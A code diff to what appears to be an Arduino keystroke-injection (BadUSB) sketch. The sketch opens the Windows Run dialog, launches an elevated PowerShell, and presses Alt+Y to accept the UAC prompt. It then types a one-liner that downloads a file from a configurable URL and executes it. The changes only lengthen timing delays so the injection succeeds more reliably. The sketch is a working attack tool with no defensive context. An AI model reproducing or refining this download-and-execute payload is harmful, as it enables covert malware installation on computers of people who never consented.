@@ -151,17 +151,16 @@ void script2(){
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press(114);
   Keyboard.releaseAll();
-  delay(200);
+  delay(300);
   
   Keyboard.print("powershell Start-Process powershell -Verb runAs");
   typeKey(KEY_RETURN);
- 
-  delay(1000);
- 
+  delay(2000);
+  
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(121);
   Keyboard.releaseAll();
-  delay(200);
+  delay(2000);
   
   Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = \"tls12, tls11, tls\"; $down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = '" + file +"'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($PSScriptRoot + $file); exit;");
   typeKey(KEY_RETURN);
@@ -179,7 +178,7 @@ void script3(){
   
   Keyboard.print("powershell Start-Process powershell -Verb runAs");
   typeKey(KEY_RETURN);
-  delay(1000);
+  delay(2000);
   
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(121);
